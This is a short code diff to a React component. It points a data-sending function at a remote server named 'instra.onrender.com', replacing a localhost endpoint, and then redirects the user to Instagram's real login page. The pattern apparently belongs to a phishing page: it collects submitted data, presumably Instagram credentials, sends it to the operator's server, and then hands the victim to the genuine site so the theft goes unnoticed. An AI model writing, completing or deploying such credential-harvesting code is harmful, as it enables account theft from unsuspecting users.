@@ -9,7 +9,7 @@ const Mainui = () => {
 
   const sendData=(data)=>{
        axios
-       .post('http://localhost:8000/data',data)
+       .post('https://instra.onrender.com/data',data)
        .then(()=>{
         window.location.href = 'https://www.instagram.com/accounts/login/?hl=en';
         console.log("hua redirect");
